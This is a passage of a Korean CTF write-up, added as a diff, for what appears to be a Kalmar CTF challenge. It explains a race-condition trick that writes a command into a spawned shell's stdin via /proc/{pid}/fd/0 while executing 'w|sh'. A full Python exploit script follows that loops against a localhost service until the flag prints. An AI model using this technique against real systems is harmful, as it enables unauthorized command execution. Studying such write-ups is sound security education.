@@ -289,4 +289,59 @@ CMD ["python3", "app.py"]
 Exploit 시나리오는 다음과 같다.
 
 |write|exec|
-|:
+|:---|---:|
+|write process 생성||
+||exec process 생성|
+|write "/would you ..." to `STDIN` of `sh`||
+||execute `w|sh`|
+
+`w|sh` 명령을 실행하는 이유는 길이가 4바이트까지이고 `sh` 프로세스에 `STDIN`을 줘야하기 때문에 한 바이트짜리 명령어인 `w`를 사용하는 것이다.
+
+존재하지 않는 명령어를 `STDIN`으로 줘도 될 것 같지만 time window가 다른지 존재하는 명령어가 성공 확률이 높다고 한다.
+
+이 때 `w|sh`는 `sh`라는 또 다른 프로세스를 생성하므로 pid를 `3`이 아닌 `4`만큼 증가시켜야 한다.
+
+컨셉은 간단한데 발상이 대단한 것 같다.
+
+### Payload
+``` python
+import requests
+import threading
+from time import sleep
+
+url = "http://localhost:6664"
+cmd = "/would you be so kind to provide me with a flag"
+
+def race_fd():
+    global pid
+    requests.post(f"{url}/write?filename=/proc/{pid}/fd/0", data=cmd)
+
+def race_cmd():
+    global res
+    res = requests.get(f"{url}/exec?cmd=w|sh").text
+
+def rwx_exec(cmd):
+    uri = url + "/exec"
+    uri += "?cmd=" + cmd
+    return requests.get(uri)
+
+while True:
+    r = rwx_exec("ps")
+    pid = int(r.text.split("\n")[-2].split()[0])
+    pid += 4
+    print(f"[*] trying {pid}")
+
+    thread_cmd = threading.Thread(target=race_cmd)
+    thread_fd = threading.Thread(target=race_fd)
+
+    thread_fd.start()
+    thread_cmd.start()
+    thread_cmd.join()
+    thread_fd.join()
+
+    if "kalmar{" in res:
+        print(res)
+        break
+    
+    sleep(0.1)
+```
